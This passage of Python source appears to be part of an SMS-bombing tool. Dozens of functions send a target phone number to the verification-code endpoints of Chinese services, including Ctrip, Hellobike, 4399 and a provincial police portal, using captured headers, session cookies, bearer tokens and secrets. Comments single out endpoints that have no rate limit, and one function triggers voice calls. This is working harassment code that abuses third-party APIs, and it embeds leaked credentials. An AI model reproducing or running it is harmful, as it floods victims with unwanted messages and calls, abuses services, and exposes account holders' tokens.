            "Referer": "https://www.dxmbaoxian.com/s/product?itemId=2000000356&channelId=dxmjr_H5-shouye-dakapian1&sourceChannel=shareMSG_wx-service-xiaochengxu-1005",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": "MASTATE=5SlGnVKFtSMEHBWE%2BY3emiu0ItEGdAqcf0JXKs4y6TsuDe%2BcqGcB5wk-p%3D%2Bl7ba4p9lS70Gk7Qb8CRRs5TlMG0gBa-X2qghW0ZnSqIYAt1j4pbiPn; MASTATE=5SlGnVKFtSMEHBWE%2BY3emiu0ItEGdAqcf0JXKs4y6TsuDe%2BcqGcB5wk-p%3D%2Bl7ba4p9lS70Gk7Qb8CRRs5TlMG0gBa-X2qghW0ZnSqIYAt1j4pbiPn; DXMBXID=DXMBXID8aad768c-ae20-4086-bbf4-3947cff1c214; LOG_CHANNEL_ID=dxmjr_H5-shouye-dakapian1; LOG_SESSION_ID=a0aa3c64-3e5a-4821-8c77-17473b0739a4-1754372069495; ISEE_DEVICE_ID_V2=2ab07d1621f620b1c62826f788179a94; ISEE_BIZ=11210039Kcue4BD2X_skkAPW48fHg7Q.T; 11210039Kcue4BD2X_skkAPW48fHg7Q=1754372070793; ISEE_COUNT=1102"
        }        
        data = {
            "from": "36",
            "tagId": "",
            "channelId": "dxmjr_H5-shouye-dakapian1",
            "sourceChannel": "shareMSG_wx-service-xiaochengxu-1005",
            "timestamp": int(time.time() * 1000),
            "wxAccessCode": None,
            "sessionId": f"a0aa3c64-3e5a-4821-8c77-17473b0739a4-{int(time.time() * 1000)}",
            "errTimes": 0,
            "syncStokenTime": 0,
            "currentSyncTimes": 0,
            "did": None,
            "phone": mobile
        }        
        response = requests.post(url, headers=headers, json=data, timeout=10)
        return f"dxmbaoxian: {response.status_code} - {response.text[:100]}"        
    except Exception as e:
        return f"dxmbaoxian错误: {str(e)}"
def send_planplus_sms(mobile):
    try:
        url = f"https://blue.planplus.cn/account/api/account/v1/member/sms/sendCode?mobile={mobile}"
        
        headers = {
            "Host": "blue.planplus.cn",
            "Connection": "keep-alive",
            "Content-Length": "0",
            "x-user-token": "TrpusLsAnnNeyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE3NTQ1Mjk3NzAsInRoaWQiOjE3NTQ1Mjk3NzAsInRva2VuIjoie1wiZnJvbVwiOlwicGxhdGZvcm1cIixcIm9wZW5pZFwiOlwib3lLN3UwQXJMVGYybjRNR2oyc0tJYVBTX0hKd1wiLFwidW5pb25pZFwiOlwib0hlQ2NzLUFwSU05N1V2anc1a3prY1E1T3N0b1wifSJ9.o1o4upLSYY2tuiNcrJIG2r-F4DoUcw6YOana759BhzLPLmpRFXDrHKOvNPBDhijD1GKvu7vnc1MyL4BHk0iEhA",
            "content-type": "application/json",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wxd4c6c416bdab4315/51/page-frame.html",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
            "Accept-Encoding": "gzip, deflate, br"
        }        
        response = requests.post(url, headers=headers, timeout=10)
        return f"planplus: {response.status_code} - {response.text[:100]}"        
    except Exception as e:
        return f"planplus错误: {str(e)}"
def send_cindasc_sms(mobile):
    try:
        url = "https://kh.cindasc.com:9096/servlet/json"       
        headers = {
            "Host": "kh.cindasc.com:9096",
            "Connection": "keep-alive",
            "Content-Length": "95",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380143 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003D5B) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 miniProgram/wx032693c3c2ecca41",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://kh.cindasc.com:9096",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://kh.cindasc.com:9096/amao/open/views/account/index.html?uid=",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": "Secure; JSESSIONID=abcTrlliyi37sewFBLMJz"
        }
        timestamp = int(time.time() * 1000)
        data = {
            "mobile_no": mobile,
            "mobileKey": timestamp,
            "funcNo": "501519",
            "op_source": "3",
            "flow_type": "zgkh",
            "ip": "",
            "mac": ""
        }
        form_data = "&".join([f"{k}={v}" for k, v in data.items()])        
        response = requests.post(url, headers=headers, data=form_data, timeout=10, verify=False)
        return f"cindasc: {response.status_code} - {response.text[:100]}"        
    except Exception as e:
        return f"cindasc错误: {str(e)}"
def send_request1(phone):
    """请求1: 今日头条"""
    url = f"https://m.dcdapp.com/passport/web/send_code/?aid=1556&data_from=tt_mp&device_platform=windows&os_version=Windows%20Unknown%20x64&device_type=microsoft&device_brand=microsoft&sdk_verison=3.8.10&ma_version=5.10.881&api_version=2&app_name=weixin&version_code=0&city_name=%E6%8F%AD%E9%98%B3&gps_city_name=%E6%8F%AD%E9%98%B3&device_id=7539801294849689088&master_aid=&user_unique_id=7539801294849088&type=24&mobile={phone}"
    try:
        requests.get(url, timeout=5)
        return True
    except:
        return False
def send_ghd_sms(phone):
    url = 'https://ghd.hikyun.com/ghd/ghdsys/web/v1/wx/user/getRegisterVerifyCode'
    headers = {'Host': 'ghd.hikyun.com', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf254100e) XWEB/16283', 'xweb_xhr': '1', 'Content-Type': 'application/json', 'Accept': '*/*', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://servicewechat.com/wx6aa3c8813b7a7d0b/11/page-frame.html', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'zh-CN,zh;q=0.9'}
    data = {"phoneNo": phone}
    requests.post(url, headers=headers, json=data, timeout=5)

def send_ctrip_sms(phone):
    url = 'https://m.ctrip.com/restapi/soa2/14593/json/SendMobileCodeV1'
    headers = {'Host': 'm.ctrip.com', 'cid': '51151095491313027340', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf254100e) XWEB/16283', 'xweb_xhr': '1', 'content-type': 'application/json', 'Accept': '*/*', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://servicewechat.com/wx4efc89b936baea18/21/page-frame.html', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Priority': 'u=1, i'}
    data = {"rtoken": "a", "version": "a", "rid": "a", "userMobile": phone, "type": 0, "verifyType": 0, "sign": "f6d4acb931c7426f3de3ae1190043df6", "head": {"sid": "4505", "cver": "606.000", "auth": "", "cid": "51151095491313027340", "appId": "wx4efc89b936baea18", "extension": [{"name": "appId", "value": "wx4efc89b936baea18"}, {"name": "platform", "value": "windows"}, {"name": "weiXinPlatform", "value": "ios"}, {"name": "reqTime", "value": "1756038790"}, {"name": "clientInfo", "value": "windows|microsoft|Windows Unknown x64|4.1.0.14|zh_CN"}, {"name": "deviceId", "value": "51151095491313027340"}, {"name": "partner", "value": "zhixing"}, {"name": "sign", "value": "ok"}, {"name": "openId", "value": "onWkw42MZeEJfXMK3cQCEX3NWDVA"}, {"name": "secretToken", "value": "odYCbb5EpqtpwbIvJqNDn89iygosntL1xdwn4hvDxlYhjypbjMqm39lcRbTKFufk"}, {"name": "aid", "value": "586924"}, {"name": "sid", "value": "1366884"}, {"name": "miniType", "value": "wechat"}, {"name": "packType", "value": "zxdj"}, {"name": "miniVersion", "value": "3.34.0"}, {"name": "unionId", "value": "oKPaqjs2WuLmjwU0ljZbGCAK4R84"}, {"name": "channel", "value": "zhixingwx"}, {"name": "scene", "value": "1005"}, {"name": "openid", "value": "onWkw42MZeEJfXMK3cQCEX3NWDVA"}]}}
    body_str = json.dumps(data)
    headers['Content-Length'] = str(len(body_str.encode('utf-8')))
    requests.post(url, headers=headers, json=data, timeout=5)

def send_lvcchong_sms(phone):
    url = 'https://appapi.lvcchong.com/sendRegisterSms'
    params = {'channelMessage': 'LVCC-WP-PH_3.0.0_Tencent-G9'}
    data = {'mobile': phone, 'ownerId': '484'}
    headers = {'Host': 'appapi.lvcchong.com', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090a13) UnifiedPCWindowsWechat(0xf254100e) XWEB/16283', 'xweb_xhr': '1', 'Content-Type': 'application/x-www-form-urlencoded', 'token': '', 'Accept': '*/*', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://servicewechat.com/wx69c84cc2efc92c40/3/page-frame.html', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'zh-CN,zh;q=0.9'}
    requests.post(url, params=params, data=data, headers=headers, timeout=5)

def send_yakeyun_sms(phone):
    url = "https://yakeyun.ddsp.go2click.cn/mini/ortho/his/reg/smsApply"
    headers = {"Host": "yakeyun.ddsp.go2click.cn", "Connection": "keep-alive", "charset": "utf-8", "appletcode": "mlk", "applethid": "", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340125 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "content-type": "application/json", "logintoken": "a863da411830d29ba13f635a1d132300", "Accept-Encoding": "gzip,compress,br,deflate", "Referer": "https://servicewechat.com/wx7e0a5d8de86658d5/166/page-frame.html"}
    data = {"phone": phone, "clientCode": "yky2020"}
    requests.post(url, headers=headers, json=data, timeout=5)

def send_ygj_sms(phone):
    url = "https://api-his.ygjkq.com/api/ygj-sms/v1.0/sms/get-phone-code-scrm"
    headers = {"Host": "api-his.ygjkq.com", "Connection": "keep-alive", "authorization": "Basic c2NybV93ZWNoYXQ6c2NybV93ZWNoYXRfc2VjcmV0", "user-type": "scrm_wechat", "charset": "utf-8", "blade-auth": "bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOm51bGwsInVzZXJfbmFtZSI6Im9wYkdVNUNmNktUdEJxQ01URENPN1ZwM0JVT3MiLCJyZWFsX25hbWUiOiIiLCJhdmF0YXIiOiIiLCJjbGllbnRfaWQiOiJzY3JtX3dlY2hhdCIsInJvbGVfbmFtZSI6bnVsbCwibGljZW5zZSI6InBvd2VyZWQgYnkgeWdqIiwicG9zdF9pZCI6bnVsbCwidXNlcl9pZCI6IjE5NjA2MzcwMDkwMjM1MjQ4NjUiLCJyb2xlX2lkIjoiIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IiIsIm9hdXRoX2lkIjoib3BiR1U1Q2Y2S1R0QnFDTVREQ083VnAzQlVPcyIsImRldGFpbCI6eyJhZ3JlZW1lbnQiOjAsImZhbWlseVN0YXR1cyI6MCwiaXNBZ2VudCI6bnVsbCwicGhvbmUiOiIiLCJzZXgiOm51bGwsImJpcnRoZGF5IjpudWxsLCJhdXRoRW1wSWQiOm51bGx9LCJleHAiOjE3NTYyOTA4NjQsImRlcHRfaWQiOiIiLCJqdGkiOiJhMGNhMGI5OC0xYjI0LTQzYzAtYmFkNC0xYmJkODE5MTdjNjQiLCJhY2NvdW50Ijoib3BiR1U1Q2Y2S1R0QnFDTVREQ083VnAzQlVPcyJ9.tME-8gOWwZrssXE-i0sduKGmjAgqzvNsSDpXssvo6s4", "accept-language": "zh-CN,zh;q=0.9", "appid": "wx8091f4dc0fbf5123", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340125 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate", "Referer": "https://servicewechat.com/wx8091f4dc0fbf5123/72/page-frame.html"}
    data = {"phone": phone, "type": 4}
    requests.post(url, headers=headers, json=data, timeout=5)

def send_dsssp_sms(phone):
    url = "https://mp.dsssp.com/aw_api/v1/login/apiLoginAwService/sendSmsRegisterVerifyCode"
    headers = {"Host": "mp.dsssp.com", "Connection": "keep-alive", "charset": "utf-8", "app-id": "wx10ad116a509bc468", "auth": "", "shop-id": "0", "sign": "6FE457C71F9662903C4A8D734CB4BEDB", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340125 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "open-id": "o1tuS5IFsqsYjnB_PQbMhuEjH3UQ", "union-id": "ozzMA65SxsPOwTcgv84bXktICFkk", "Accept-Encoding": "gzip,compress,br,deflate", "v": "1.0.12.85", "content-type": "application/json", "project-id": "2010156361", "store-puid": "82705", "ts": "1756288002819", "Referer": "https://servicewechat.com/wx10ad116a509bc468/46/page-frame.html"}
    data = {"mobile": phone, "areaCode": ""}
    requests.post(url, headers=headers, json=data, timeout=5)

def send_icharge_sms(phone):
    url = "https://icharge.huajiecloud.com/icharge-mp/user/telCode"
    headers = {"Host": "icharge.huajiecloud.com", "Connection": "keep-alive", "charset": "utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340125 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "content-type": "application/x-www-form-urlencoded", "sessionid": "", "Accept-Encoding": "gzip,compress,br,deflate", "Referer": "https://servicewechat.com/wxc9d21d6822c37144/48/page-frame.html"}
    data = f"tel={phone}&type=login&merchantCode=huajie"
    requests.post(url, headers=headers, data=data, timeout=5)

def send_bird_sms(phone):
    url = f"https://bird.sjmsz.com/api/wx/getVerificationCode/{phone}"
    headers = {"Host": "bird.sjmsz.com", "Connection": "keep-alive", "authorization": "", "charset": "utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340125 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate", "Referer": "https://servicewechat.com/wx661503e348620c64/26/page-frame.html"}
    requests.post(url, headers=headers, timeout=5)

def send_hellobike_sms(phone):
    url = "https://api.hellobike.com/api?user.account.sendCodeV2"
    headers = {"Host": "api.hellobike.com", "Connection": "keep-alive", "charset": "utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340125 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate", "Referer": "https://servicewechat.com/wx5b8f2b678eb20a9b/120/page-frame.html"}
    data = {"action": "user.account.sendCodeV2", "systemCode": "C8", "env": "pro", "mobile": phone}
    requests.post(url, headers=headers, json=data, timeout=5)

def send_myzhishi_sms(phone):
    url = "https://web.myzhishi.cn/index.php/api/admin/admin/send_sms"
    headers = {"Host": "web.myzhishi.cn", "Connection": "keep-alive", "charset": "utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340125 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate", "Referer": "https://servicewechat.com/wxebce0c9d143ab306/50/page-frame.html"}
    data = {"tel": phone, "w": 2, "imgyzm_total": 20, "token": "", "dailiid": "", "appid": "wxebce0c9d143ab306", "laiyuan_appid": "wxebce0c9d143ab306", "app_type": "miniapp", "app_v": 186, "devicetype": "android", "peizhi_xlid": 565, "peizhi_kslxid": 1607}
    requests.post(url, headers=headers, json=data, timeout=5)

def send_suzhiyouxuan_sms(phone):
    url = f"https://wx.suzhiyouxuan.com/miniprogram/Parent/AuthorizeManager/sendAuthCode?open_id=oJ4g34wu7VZ0zXH8nGuMGF6ZBIhg&parent_id=&child_id=&phone={phone}"
    headers = {"Host": "wx.suzhiyouxuan.com", "Connection": "keep-alive", "charset": "utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340125 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate", "token": "", "Referer": "https://servicewechat.com/wx0e886225c0f71b79/379/page-frame.html"}
    requests.get(url, headers=headers, timeout=5)

def send_jswxjy_sms(phone):
    url = "https://w.jswxjy.top/prod-api/api/stu/user/getVerificationCode"
    headers = {"Host": "w.jswxjy.top", "Connection": "keep-alive", "charset": "utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340125 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate", "Referer": "https://servicewechat.com/wx6073650033a275e2/20/page-frame.html"}
    data = {"type": "1", "phone": phone}
    requests.post(url, headers=headers, json=data, timeout=5)

def send_yangfedu_sms(phone):
    url = f"https://sw.yangfedu.com/miniapp/sendMsg/{phone}"
    headers = {"Host": "sw.yangfedu.com", "Connection": "keep-alive", "charset": "utf-8", "logtype": "", "openid": "", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340125 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate", "userid": "", "account": "", "Referer": "https://servicewechat.com/wx785d722ac29d05db/36/page-frame.html"}
    requests.post(url, headers=headers, timeout=5)

def send_yidivip_sms(phone):
    url = f"https://mowo.yidivip.com/api/verification?phone={phone}"
    headers = {"Host": "mowo.yidivip.com", "Connection": "keep-alive", "charset": "utf-8", "x-token": "", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340125 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate", "projectid": "", "Referer": "https://servicewechat.com/wx9c060a85108c4d23/52/page-frame.html"}
    requests.get(url, headers=headers, timeout=5)

def send_hellobike_voice(phone):
    url = "https://api.hellobike.com/api?action=user.account.sendVoiceCode"
    headers = {"Host": "api.hellobike.com", "Connection": "keep-alive", "charset": "utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340125 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate", "Referer": "https://servicewechat.com/wx40ddbc37ec3a370c/23/page-frame.html"}
    data = {"env": "pro", "platform": 18, "systemCode": "Zyq04", "clientSystemCode": 20, "channelId": 48, "miniVersion": "0.1.23", "riskParams": {"systemCode": "Zyq04"}, "__sysTag": "", "pageSourceType": "NATIVE", "mobile": phone, "action": "user.account.sendVoiceCode"}
    requests.post(url, headers=headers, json=data, timeout=5)

def send_linde_sms(phone):
    url = f"https://erental.linde-xiamen.com.cn/api/v1/m/wxmp/auth/getSmsCode?phone={phone}&smsType=LOGIN_SMS"
    requests.get(url, timeout=5)

def send_dxzuji_sms(phone):
    url = "https://lg.dxzuji.com/api/getVerificationCode"
    headers = {"Host": "lg.dxzuji.com", "Connection": "keep-alive", "authorization": "Bearer_", "charset": "utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; V2002A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340153 MMWEBSDK/20240404 MMWEBID/5568 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29175 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "client": "mp-weixin", "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate", "token": "", "Referer": "https://servicewechat.com/wx7f8df11a8789dfb6/2/page-frame.html"}
    data = {"phone": phone}
    requests.post(url, headers=headers, json=data, timeout=5)

def send_quzhououlan_sms(phone):
    url = "https://www.quzhououlan.com//index.php/api/user.useropen/sendCode"
    headers = {"Host": "www.quzhououlan.com", "Connection": "keep-alive", "charset": "utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; V2002A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340153 MMWEBSDK/20240404 MMWEBID/5568 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29175 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "content-type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip,compress,br,deflate", "Referer": "https://servicewechat.com/wxe57227955c919653/2/page-frame.html"}
    data = f"mobile={phone}&type=h5_register&time=2025-08-28%2013%3A46%3A28&pass=27ccb38c9b5b4562278da7d9ba58466f&token=&tuiguangid=&admin_id=&supplierid=&country=&province=&city=&district=undefined&app_id=10001&supervise_type="
    requests.post(url, headers=headers, data=data, timeout=5)

def send_ddzuwu_sms(phone):
    url = "https://api-smart.ddzuwu.com/api/users/login/send-sms"
    headers = {"Host": "api-smart.ddzuwu.com", "Connection": "keep-alive", "authorization": "Bearer", "charset": "utf-8", "os": "2", "x-requested-with": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340125 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate", "version": "0.2.14", "platform": "4", "accept": "application/json, text/plain, */*", "Referer": "https://servicewechat.com/wx1ddfd14e6640833a/51/page-frame.html"}
    data = {"phone": phone}
    requests.post(url, headers=headers, json=data, timeout=5)

def send_yimitongxun_sms(phone):
    url = "https://f.ts.yimitongxun.com/mp/sendSmsCode"
    headers = {"Host": "f.ts.yimitongxun.com", "Connection": "keep-alive", "charset": "utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340125 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android", "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate", "token": "", "Referer": "https://servicewechat.com/wx5fb830b234320db1/144/page-frame.html"}
    data = {"mobile": phone}
    requests.post(url, headers=headers, json=data, timeout=5)


def send_request2(phone):
    """请求2: 小川云"""
    url = f"https://saas.api.xiaochuanyun.com/api/public/sms/send/register?mobile={phone}"
    try:
        requests.get(url, timeout=5)
        return True
    except:
        return False

def send_request3(phone):
    """请求3: 贪玩"""
    url = f"http://www.tanwan.com/api/reg_json_2019.php?act=3&phone={phone}&callback=jQuery112003247368730630804_1643269992344&_=1643269992347"
    try:
        requests.get(url, timeout=5)
        return True
    except:
        return False

def send_request4(phone):
    """请求4: 凤凰智信 (无60秒限制)"""
    url = f"https://hpm.api.ihuopiao.com/cid/api/v1/sms-code/sendLoginCode?phoneNumber={phone}&checkOnly=false"
    try:
        requests.get(url, timeout=5)
        return True
    except:
        return False

def send_request5(phone):
    """请求5: 智林信达 (无60秒限制)"""
    url = f"https://www.zhilinxinda.com:8088/login/getVerifyCode?mobile={phone}"
    try:
        requests.get(url, timeout=5)
        return True
    except:
        return False

def send_request6(phone):
    """请求6: 领克汽车"""
    url = f"https://app-services.lynkco.com.cn/auth/mp/uc/send-Sms?mobile={phone}&appId=wx4e8c1172fe132106"
    try:
        requests.get(url, timeout=5)
        return True
    except:
        return False

def send_request7(phone):
    """请求7: 江苏公安"""
    url = f"https://ythpt.jsga.gov.cn/jsgawx/sms/sendSmsByMobile?mobile={phone}"
    try:
        requests.get(url, timeout=5)
        return True
    except:
        return False

def send_request8(phone):
    """请求8: 健康无忧"""
    url = f"http://mhos.jiankang51.cn/support/get_data?pltId=03&productId=004&version=1.00.00&sessionId=&mName=getCheckCode&pContent=%7B%22phoneNumber%22%3A%22{phone}%22%2C%22businessType%22%3A%221%22%7D"
    try:
        requests.get(url, timeout=5)
        return True
    except:
        return False

def send_request9(phone):
    """请求9: 4399游戏"""
    url = f"https://ptlogin.4399.com/ptlogin/sendPhoneLoginCode.do?phone={phone}&appId=www_home&v=2&sig=&t={phone}&v=2"
    try:
        requests.get(url, timeout=5)
        return True
    except:
        return False

def send_request10(phone):
    """请求10: 万达商场"""
    url = f"https://fd.cmdjh.com/wfmall//app/sendCode?nationalCode=0086&mobile={phone}&companyId=1000001"
    try:
        requests.get(url, timeout=5)
        return True
    except:
        return False

def send_request11(phone):
    """请求11: 金太阳教育"""
    url = f"https://jdapi.jd100.com/uc/v1/getSMSCode?account={phone}&sign_type=1&use_type=1"
    try:
        requests.get(url, timeout=5)
        return True
    except:
        return False

